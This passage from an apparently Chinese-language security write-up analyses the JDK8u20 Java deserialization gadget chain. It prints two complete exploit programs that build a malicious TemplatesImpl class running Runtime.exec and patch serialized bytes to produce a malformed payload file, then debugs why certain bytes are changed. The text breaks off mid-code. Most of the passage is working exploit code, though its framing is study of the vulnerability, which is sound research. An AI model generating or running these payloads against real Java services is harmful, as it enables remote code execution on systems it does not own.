\u65b9\u6cd5\uff0c\u505a\u4e86\u4ee5\u4e0b2\u4e2a\u64cd\u4f5c: 1. \u8bbe\u7f6e serializable >0 2. \u7236\u7c7b beanContextChildPeer \u6210\u5458\u7684\u503c\u4e3a\u5f53\u524d\u5bf9\u8c61: \u7531\u4e8e BeanContextChildSupport \u5bf9\u8c61\u5df2\u7ecf\u51fa\u73b0\u8fc7\u4e86,\u8fd9\u91cc\u76f4\u63a5\u8fdb\u884c TC_REFERENCE \u5f15\u7528\u5bf9\u5e94\u7684 Handle 5. \u63d2\u5165\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\u3002\u524d\u9762\u5206\u6790\u8fc7\u5728 readChildren \u65b9\u6cd5\u4e2d\u4f1a\u518d\u6b21\u8fdb\u884c ois.readObject() \uff0c\u56e0\u6b64\u4f1a\u5c06\u6b64\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u5e76\u4e14\u6355\u6349\u5f02\u5e38\uff0c\u4ea7\u751f\u4e00\u4e2aHandle 6. \u8d4b\u503c h \u6210\u5458\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528 TC_REFERENCE \u5f15\u7528\u5230\u521a\u521a\u4ea7\u751f\u7684newHandle\u5373\u53ef\uff0c\u9700\u8981\u624b\u52a8\u8ba1\u7b97handle\u503c exp2 # \u8fd9\u4e2aexp2\u6765\u81eafeihong\u5e08\u5085\uff0c\u901a\u8fc7\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u540e\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u7ec6\u5fae\u5730\u8c03\u6574\u6765\u6784\u9020\u7578\u5f62\u7684JDK8u20\u94fe\uff0c\u6ca1\u6709\u5229\u7528\u6210\u5458\u629b\u5f03\u673a\u5236\uff0c\u4e5f\u6bd4\u524d\u9762\u7684exp1\u7a0d\u5fae\u597d\u7406\u89e3\u4e00\u70b9 - \u53c2\u8003\u6587\u7ae0\u5728 \u4ee5\u4e00\u79cd\u66f4\u7b80\u5355\u7684\u65b9\u5f0f\u6784\u9020JRE8u20 Gadget - \u5b8c\u6574\u6e90\u7801\u5728 feihong-cs/jre8u20_gadget \u8fd9\u91cc\u6ca1\u6709\u5229\u7528\u6210\u5458\u629b\u5f03\u673a\u5236\uff0c\u800c\u662f\u5229\u7528\u5230\u4e86LinkedHashSet\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4e00\u4e00\u53cd\u5e8f\u5217\u5316map\u4e2d\u5bf9\u8c61\u7684\u673a\u5236\uff0c\u5148\u5c06 BeanContextSupport \u653e\u5728\u6700\u524d\u9762\uff0c\u8ba9\u5176\u4ea7\u751f\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\u7684newHandle\uff0c\u540e\u7eed\u518d\u6b63\u5e38\u5730\u6267\u884cJDK7u21\uff0c\u6574\u4e2a\u94fe\u7684\u6784\u9020\u903b\u8f91\u5927\u6982\u5982\u4e0b: \u5728\u8fdb\u884c\u5e8f\u5217\u5316\u7684\u65f6\u5019\uff0c\u5411\u5e8f\u5217\u5316\u6d41\u4e2d\u5199\u5165\u4e86 4 \u4e2a\u5bf9\u8c61\uff0c\u4f46\u662f\u901a\u8fc7\u4fee\u6539\u5e8f\u5217\u5316\u4e2d\u7684\u4e00\u4e9b\u7279\u6b8a\u7684 byte \uff0c\u6784\u9020\u4e86\u4e00\u4e2a\u6211\u4eec\u60f3\u8981\u7684\u5e8f\u5217\u5316\u6d41\u3002\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\uff0c LinkedHashSet \u8bfb\u5230\u7684 size \u4e3a 3 ,\u5728\u53cd\u5e8f\u5217\u5316\u7b2c\u4e00\u4e2a\u5bf9\u8c61 BeanContextSupport \u7684\u65f6\u5019\uff0c\u4f1a\u8fdb\u5165\u5230 BeanContextSupport \u7684 readChildren \u903b\u8f91\uff0c\u6210\u529f\u5c06 AnnotationInvocationHander \u8fdb\u884c\u4e86\u8fd8\u539f\uff08\u867d\u7136 AnnotationInvocationHander \u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4f46\u662f BeanContextSupport \u6355\u6349\u4e86\u5f02\u5e38\uff09\u3002\u968f\u540e LinkedHashSet \u5728\u53cd\u5e8f\u5217\u5316\u7b2c\u4e8c\u4e2a\u548c\u4e09\u4e2a\u5143\u7d20\u7684\u65f6\u5019\uff0c\u4f1a\u53d1\u751f\u54c8\u5e0c\u78b0\u649e\uff0c\u4ece\u800c\u5bfc\u81f4 RCE \u3002 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import javax.xml.transform.Templates ; import java.beans.beancontext.BeanContextSupport ; import java.io.* ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.util.HashMap ; import java.util.HashSet ; import java.util.LinkedHashSet ; import java.util.Map ; public class jdk8u20EXP { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { // jdk 7u21 TemplatesImpl templates = generateEvilTemplates (); HashMap map = new HashMap (); map . put ( \"f5a5a608\" , \"zero\" ); Constructor handlerConstructor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); handlerConstructor . setAccessible ( true ); InvocationHandler tempHandler = ( InvocationHandler ) handlerConstructor . newInstance ( Templates . class , map ); // \u4e3atempHandler\u521b\u9020\u4e00\u5c42\u4ee3\u7406 Templates proxy = ( Templates ) Proxy . newProxyInstance ( jdk7u21 . class . getClassLoader (), new Class [] { Templates . class }, tempHandler ); // \u5b9e\u4f8b\u5316HashSet\uff0c\u5e76\u5c06\u4e24\u4e2a\u5bf9\u8c61\u653e\u8fdb\u53bb HashSet set = new LinkedHashSet (); // \u5c06\u6076\u610ftemplates\u8bbe\u7f6e\u5230map\u4e2d map . put ( \"f5a5a608\" , templates ); // jdk7u21 end BeanContextSupport bcs = new BeanContextSupport (); Class cc = Class . forName ( \"java.beans.beancontext.BeanContextSupport\" ); Field beanContextChildPeer = cc . getSuperclass (). getDeclaredField ( \"beanContextChildPeer\" ); beanContextChildPeer . set ( bcs , bcs ); set . add ( bcs ); //\u5e8f\u5217\u5316 ByteArrayOutputStream baous = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( baous ); oos . writeObject ( set ); oos . writeObject ( tempHandler ); oos . writeObject ( templates ); oos . writeObject ( proxy ); oos . close (); byte [] bytes = baous . toByteArray (); System . out . println ( \"[+] Modify HashSet size from 1 to 3\" ); bytes [ 89 ] = 3 ; //\u4fee\u6539hashset\u7684\u957f\u5ea6\uff08\u5143\u7d20\u4e2a\u6570\uff09 //\u8c03\u6574 TC_ENDBLOCKDATA \u6807\u8bb0\u7684\u4f4d\u7f6e\uff0c\u5148\u6682\u65f6\u5220\u9664 //0x73 = 115, 0x78 = 120 //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 0 && bytes [ i + 1 ] == 0 && bytes [ i + 2 ] == 0 & bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 120 && bytes [ i + 5 ] == 120 && bytes [ i + 6 ] == 115 ){ System . out . println ( \"[+] Delete TC_ENDBLOCKDATA at the end of HashSet\" ); bytes = Util . deleteAt ( bytes , i + 5 ); break ; } } //\u5c06 serializable \u7684\u503c\u4fee\u6539\u4e3a 1 //0x73 = 115, 0x78 = 120 //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 120 && bytes [ i + 1 ] == 0 && bytes [ i + 2 ] == 1 && bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 0 && bytes [ i + 5 ] == 0 && bytes [ i + 6 ] == 0 && bytes [ i + 7 ] == 115 ){ System . out . println ( \"[+] Modify BeanContextSupport.serializable from 0 to 1\" ); bytes [ i + 6 ] = 1 ; break ; } } /** TC_BLOCKDATA - 0x77 Length - 4 - 0x04 Contents - 0x00000000 TC_ENDBLOCKDATA - 0x78 **/ //\u628a\u8fd9\u90e8\u5206\u5185\u5bb9\u5148\u5220\u9664\uff0c\u518d\u9644\u52a0\u5230 AnnotationInvocationHandler \u4e4b\u540e //\u76ee\u7684\u662f\u8ba9 AnnotationInvocationHandler \u53d8\u6210 BeanContextSupport \u7684\u6570\u636e\u6d41 //0x77 = 119, 0x78 = 120 //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 119 && bytes [ i + 1 ] == 4 && bytes [ i + 2 ] == 0 && bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 0 && bytes [ i + 5 ] == 0 && bytes [ i + 6 ] == 120 ){ System . out . println ( \"[+] Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport\" ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); bytes = Util . deleteAt ( bytes , i ); break ; } } /* serialVersionUID - 0x00 00 00 00 00 00 00 00 newHandle 0x00 7e 00 28 classDescFlags - 0x00 - fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 29 */ //0x78 = 120, 0x70 = 112 //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 0 && bytes [ i + 1 ] == 0 && bytes [ i + 2 ] == 0 && bytes [ i + 3 ] == 0 && bytes [ i + 4 ] == 0 && bytes [ i + 5 ] == 0 && bytes [ i + 6 ] == 0 && bytes [ i + 7 ] == 0 && bytes [ i + 8 ] == 0 && bytes [ i + 9 ] == 0 && bytes [ i + 10 ] == 0 && bytes [ i + 11 ] == 120 && bytes [ i + 12 ] == 112 ){ System . out . println ( \"[+] Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler\" ); i = i + 13 ; bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x77 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x04 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x00 ); bytes = Util . addAtIndex ( bytes , i ++ , ( byte ) 0x78 ); break ; } } //\u5c06 sun.reflect.annotation.nAnnotationInvocationHandler \u7684 classDescFlags \u7531 SC_SERIALIZABLE \u4fee\u6539\u4e3a SC_SERIALIZABLE | SC_WRITE_METHOD // //\u8fd9\u4e00\u6b65\u5176\u5b9e\u4e0d\u662f\u901a\u8fc7\u7406\u8bba\u63a8\u7b97\u51fa\u6765\u7684\uff0c\u662f\u901a\u8fc7debug \u4ee5\u53ca\u67e5\u770b pwntester\u7684 poc \u53d1\u73b0\u9700\u8981\u8fd9\u4e48\u6539 // //\u539f\u56e0\u662f\u5982\u679c\u4e0d\u8bbe\u7f6e SC_WRITE_METHOD \u6807\u5fd7\u7684\u8bdd defaultDataEd = true\uff0c\u5bfc\u81f4 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1)) // -> count = ois.readInt(); \u62a5\u9519\uff0c\u65e0\u6cd5\u5b8c\u6210\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b // \u6ca1\u6709 SC_WRITE_METHOD \u6807\u8bb0\uff0c\u8ba4\u4e3a\u8fd9\u4e2a\u53cd\u5e8f\u5217\u6d41\u5230\u6b64\u5c31\u7ed3\u675f\u4e86 // \u6807\u8bb0\uff1a 7375 6e2e 7265 666c 6563 --> sun.reflect... for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 115 && bytes [ i + 1 ] == 117 && bytes [ i + 2 ] == 110 && bytes [ i + 3 ] == 46 && bytes [ i + 4 ] == 114 && bytes [ i + 5 ] == 101 && bytes [ i + 6 ] == 102 && bytes [ i + 7 ] == 108 ){ System . out . println ( \"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\" ); i = i + 58 ; bytes [ i ] = 3 ; break ; } } //\u52a0\u56de\u4e4b\u524d\u5220\u9664\u7684 TC_BLOCKDATA\uff0c\u8868\u660e HashSet \u5230\u6b64\u7ed3\u675f System . out . println ( \"[+] Add TC_BLOCKDATA at end\" ); bytes = Util . addAtLast ( bytes , ( byte ) 0x78 ); FileOutputStream fous = new FileOutputStream ( \"jre8u20.ser\" ); fous . write ( bytes ); //\u53cd\u5e8f\u5217\u5316 FileInputStream fis = new FileInputStream ( \"jre8u20.ser\" ); ObjectInputStream ois = new ObjectInputStream ( fis ); ois . readObject (); ois . close (); } public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } } exp3 # \u8fd9\u4e2aexp3\u6765\u81ea\u6c88\u6c89\u821f\u5e08\u5085\uff0c\u4e5f\u662f\u901a\u8fc7\u6b63\u5e38\u53cd\u5e8f\u5217\u5316\u540e\u5bf9\u5b57\u8282\u7801\u8fdb\u884c\u7ec6\u5fae\u5730\u8c03\u6574\u6765\u6784\u9020\u7578\u5f62\u7684JDK8u20\u94fe\uff0c\u662fexp2\u7684\u7b80\u5316\u7248\uff0c\u4fee\u6539\u7684\u5b57\u8282\u7801\u66f4\u5c11\uff0c\u5177\u4f53\u539f\u7406\u53ef\u4ee5\u53c2\u89c1 \u8fd9\u91cc \uff0c\u8fd9\u91cc\u6839\u636eexp2\u548c\u539f\u7406\u91cd\u5199\u4e86\u4e0bexp: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import javax.xml.transform.Templates ; import java.beans.beancontext.BeanContextSupport ; import java.io.* ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.util.* ; public class jdk8u20EXP3 { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"notepad.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { // \u83b7\u53d6\u6076\u610f\u7684TemplatesImpl TemplatesImpl templates = generateEvilTemplates (); // \u65b0\u5efa2\u4e2amap\uff0c\u7b2c\u4e00\u4e2amap\u7528\u4e8e\u54c8\u5e0c\u78b0\u649e\u9020\u6210rce\uff0c\u7b2c\u4e8c\u4e2amap\u4f5c\u4e3aBeanContextSupport\u7684children HashMap map = new HashMap (); HashMap map2 = new HashMap (); // \u5148\u653e\u5165\u5047\u7684\u6570\u636e\uff0c\u9632\u6b62\u5728\u6784\u9020\u65f6\u89e6\u53d1rce map . put ( \"f5a5a608\" , \"zero\" ); // \u6784\u9020AnnotationInvocationHandler Constructor handlerConstructor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); handlerConstructor . setAccessible ( true ); InvocationHandler tempHandler = ( InvocationHandler ) handlerConstructor . newInstance ( Templates . class , map ); // \u4e3atempHandler\u521b\u9020\u4e00\u5c42\u4ee3\u7406 Templates proxy = ( Templates ) Proxy . newProxyInstance ( jdk7u21 . class . getClassLoader (), new Class [] { Templates . class }, tempHandler ); // \u5b9e\u4f8b\u5316HashSet HashSet set = new LinkedHashSet (); BeanContextSupport bcs = new BeanContextSupport (); bcs . beanContextChildPeer = bcs ; setFieldValue ( bcs , \"serializable\" , 1 ); setFieldValue ( bcs , \"children\" , map2 ); // map2\u5c06tempHandler\u653e\u5165\uff0c\u8fdb\u5165readChildren\u7684try-catch-readObject\u4e2d map2 . put ( tempHandler , null ); // \u5148\u5b58\u653ebcs\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u5148\u53cd\u5e8f\u5217\u5316bcs,\u4ece\u800c\u7559\u4e0b\u6076\u610fAnnotationInvocationHandler\u7684Handle set . add ( bcs ); set . add ( templates ); // \u540e\u7eedproxy\u76f4\u63a5\u5f15\u7528\u4e86\u524d\u9762\u7684\u6076\u610fHandle set . add ( proxy ); // \u5c06\u771f\u6b63\u7684templates\u653e\u5165map\u4e2d\u7528\u4e8e\u54c8\u5e0c\u78b0\u649e map . put ( \"f5a5a608\" , templates ); //\u5e8f\u5217\u5316 ByteArrayOutputStream baous = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( baous ); oos . writeObject ( set ); oos . close (); byte [] bytes = baous . toByteArray (); //\u5c06 sun.reflect.annotation.nAnnotationInvocationHandler \u7684 classDescFlags \u7531 SC_SERIALIZABLE \u4fee\u6539\u4e3a SC_SERIALIZABLE | SC_WRITE_METHOD // //\u8fd9\u4e00\u6b65\u5176\u5b9e\u4e0d\u662f\u901a\u8fc7\u7406\u8bba\u63a8\u7b97\u51fa\u6765\u7684\uff0c\u662f\u901a\u8fc7debug \u4ee5\u53ca\u67e5\u770b pwntester\u7684 poc \u53d1\u73b0\u9700\u8981\u8fd9\u4e48\u6539 // //\u539f\u56e0\u662f\u5982\u679c\u4e0d\u8bbe\u7f6e SC_WRITE_METHOD \u6807\u5fd7\u7684\u8bdd defaultDataEd = true\uff0c\u5bfc\u81f4 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1)) // -> count = ois.readInt(); \u62a5\u9519\uff0c\u65e0\u6cd5\u5b8c\u6210\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b // \u6ca1\u6709 SC_WRITE_METHOD \u6807\u8bb0\uff0c\u8ba4\u4e3a\u8fd9\u4e2a\u53cd\u5e8f\u5217\u6d41\u5230\u6b64\u5c31\u7ed3\u675f\u4e86 // \u6807\u8bb0\uff1a 7375 6e2e 7265 666c 6563 --> sun.reflect... for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 115 && bytes [ i + 1 ] == 117 && bytes [ i + 2 ] == 110 && bytes [ i + 3 ] == 46 && bytes [ i + 4 ] == 114 && bytes [ i + 5 ] == 101 && bytes [ i + 6 ] == 102 && bytes [ i + 7 ] == 108 ){ System . out . println ( \"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\" ); i = i + 58 ; bytes [ i ] = 3 ; break ; } } // \u8fd0\u884c\u5230BeanContextSupport.deserialize()\u4e2d\u6b64\u65f6ois.readInt()\u65f6\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u53ef\u80fd\u662f\u4e2aTC_OBJECT\u6216\u8005TC_NULL\uff0c\u4e3a\u4e86\u8ba9\u653b\u51fb\u987a\u5229\uff0c\u5fc5\u987b\u8ba9ois.readInt()\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u662fTC_BLOCKDATA\u5305\u88f9\u7684\u6574\u578b\u53d8\u91cf0 // 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> // 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78 for ( int i = 0 ; i < bytes . length ; i ++ ){ if ( bytes [ i ] == 0x70 && bytes [ i + 1 ] == 0x77 && bytes [ i + 2 ] == 0x04 && bytes [ i + 3 ] == 0x00 && bytes [ i + 4 ] == 0x00 && bytes [ i + 5 ] == 0x00 && bytes [ i + 6 ] == 0x00 && bytes [ i + 7 ] == 0x78 ){ System . out . println ( \"[+] Change 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78\" ); bytes [ i ] = 0x77 ; bytes [ i + 1 ] = 0x04 ; bytes [ i + 2 ] = 0x00 ; bytes [ i + 6 ] = 0x70 ; break ; } } // \u5e8f\u5217\u5316 FileOutputStream fous = new FileOutputStream ( \"jre8u20.ser\" ); fous . write ( bytes ); // \u53cd\u5e8f\u5217\u5316 FileInputStream fis = new FileInputStream ( \"jre8u20.ser\" ); ObjectInputStream ois = new ObjectInputStream ( fis ); ois . readObject (); ois . close (); } public static void setFieldValue ( Object obj , String fieldName , Object value ) throws Exception { Field field = obj . getClass (). getDeclaredField ( fieldName ); field . setAccessible ( true ); field . set ( obj , value ); } } \u56f0\u60d1\u4e0e\u89e3\u60d1 # \u56f0\u60d11 # exp3\u91cc\u6709\u8fd9\u4e48\u4e00\u6bb5: //\u5c06 sun.reflect.annotation.nAnnotationInvocationHandler \u7684 classDescFlags \u7531 SC_SERIALIZABLE \u4fee\u6539\u4e3a SC_SERIALIZABLE | SC_WRITE_METHOD // //\u8fd9\u4e00\u6b65\u5176\u5b9e\u4e0d\u662f\u901a\u8fc7\u7406\u8bba\u63a8\u7b97\u51fa\u6765\u7684\uff0c\u662f\u901a\u8fc7debug \u4ee5\u53ca\u67e5\u770b pwntester\u7684 poc \u53d1\u73b0\u9700\u8981\u8fd9\u4e48\u6539 // //\u539f\u56e0\u662f\u5982\u679c\u4e0d\u8bbe\u7f6e SC_WRITE_METHOD \u6807\u5fd7\u7684\u8bdd defaultDataEd = true\uff0c\u5bfc\u81f4 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1)) // -> count = ois.readInt(); \u62a5\u9519\uff0c\u65e0\u6cd5\u5b8c\u6210\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b // \u6ca1\u6709 SC_WRITE_METHOD \u6807\u8bb0\uff0c\u8ba4\u4e3a\u8fd9\u4e2a\u53cd\u5e8f\u5217\u6d41\u5230\u6b64\u5c31\u7ed3\u675f\u4e86 // \u6807\u8bb0\uff1a 7375 6e2e 7265 666c 6563 --> sun.reflect... for(int i = 0; i < bytes.length; i++){ if(bytes[i] == 115 && bytes[i+1] == 117 && bytes[i+2] == 110 && bytes[i+3] == 46 && bytes[i + 4] == 114 && bytes[i+5] == 101 && bytes[i+6] == 102 && bytes[i+7] == 108 ){ System.out.println(\"[+] Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to \" + \"SC_SERIALIZABLE | SC_WRITE_METHOD\"); i = i + 58; bytes[i] = 3; break; } } \u8fd9\u91cc\u5c06 AnnotationInvocationHandler \u7684 classDescFlags \u6dfb\u52a0\u4e86 SC_WRITE_METHOD \u8fd9\u4e2a\u6807\u5fd7\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f \u6211\u4eec\u5728 BeanContextSupport#readChildren \u5904\u6253\u4e0b\u65ad\u70b9\uff0c\u67e5\u770b\u8c03\u7528\u6808: \u8fd9\u91cc\u6709\u4e00\u4e2a readSerialData \uff0c\u8ddf\u8fdb\u4ee3\u7801: \u73b0\u5728\u4ee3\u7801\u8d70\u5230\u4e86 slotDesc.invokeReadObject \u5904\uff0c\u800c\u7531\u4e8e\u6211\u4eec\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u5e76\u6355\u6349\u4e86\u5f02\u5e38\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u540e\u7eed\u7684\u4ee3\u7801\u5c06\u4e0d\u518d\u6267\u884c\uff0c\u5373\u540e\u7eed\u4e0d\u4f1a\u518d\u8bbe\u7f6e defaultDataEnd = _false_``; \uff0c\u90a3\u4e48\u8fd9\u4e2adefaultDataEnd\u662f\u7528\u6765\u505a\u4ec0\u4e48\u7684\u5462\uff1f \u5f53\u6210\u5458\u5757\u7ed3\u675f\u4f46\u6ca1\u6709TC_ENDBLOCKDATA\u65f6\u5176\u4f1a\u88ab\u8bbe\u7f6e\u4e3aTrue\u3002 \u5f53\u6211\u4eec\u628a\u4e0a\u9762\u90a3\u6bb5\u4fee\u6539\u6807\u5fd7\u7684\u4ee3\u7801\u6ce8\u91ca\u540e\u518d\u8fdb\u884c\u8c03\u8bd5: \u5176\u4f1a\u8bbe\u7f6e defaultDataEnd=True \uff0c\u7531\u4e8e\u5f02\u5e38\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\u540e\u7eed\u8bbe\u7f6e defaultDataEnd=False \u7684\u4ee3\u7801\u88ab\u8df3\u8fc7\u4e86\u3002\u6211\u4eec\u770b\u770b\u540e\u7eed ois.readInt() \uff0c\u4e00\u76f4\u8ddf\u8fdb\u5230 DataInputStream#readInt \u4e2d: \u7ee7\u7eed\u8ddf\u8fdb in.read() : \u8ddf\u8fdb refill() : \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u8fd4\u56de\u4e86-1\uff0c\u4e00\u76f4\u56de\u6eaf\u8fc7\u53bb\uff0c\u5bfc\u81f44\u4e2a in.read() \u90fd\u4f1a\u8fd4\u56de-1\uff0c\u629b\u51fa EOFException \u3002 \u8fd9\u91cc\u4f7f\u7528\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u5c06 AnnotationInvocationHandler \u7684 classDescFlags \u6dfb\u52a0\u4e86 SC_WRITE_METHOD \u6807\u5fd7\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u8fdb\u5165if\u5224\u65ad\u4e2d\uff0c\u4e00\u5f00\u59cb\u5c31\u4e0d\u4f1a\u5c06 defaultDataEnd=True \uff0c\u4e5f\u5c31\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u4f7f\u5f97 ois.readInt() \u80fd\u591f\u6709\u673a\u4f1a\u8bfb\u53d6\u5230Int\u3002 \u56f0\u60d12 # exp3\u91cc\u6709\u8fd9\u4e48\u4e00\u6bb5: // \u8fd0\u884c\u5230BeanContextSupport.deserialize()\u4e2d\u6b64\u65f6ois.readInt()\u65f6\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u53ef\u80fd\u662f\u4e2aTC_OBJECT\u6216\u8005TC_NULL\uff0c\u4e3a\u4e86\u8ba9\u653b\u51fb\u987a\u5229\uff0c\u5fc5\u987b\u8ba9ois.readInt()\u9762\u5bf9\u7684\u5e8f\u5217\u5316\u6570\u636e\u662fTC_BLOCKDATA\u5305\u88f9\u7684\u6574\u578b\u53d8\u91cf0 // 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> // 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78 for(int i = 0; i < bytes.length; i++){ if(bytes[i] == 0x70 && bytes[i+1] == 0x77 && bytes[i+2] == 0x04 && bytes[i+3] == 0x00 && bytes[i + 4] == 0x00 && bytes[i+5] == 0x00 && bytes[i+6] == 0x00 && bytes[i+7] == 0x78){ System.out.println(\"[+] Change 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> 0x77, 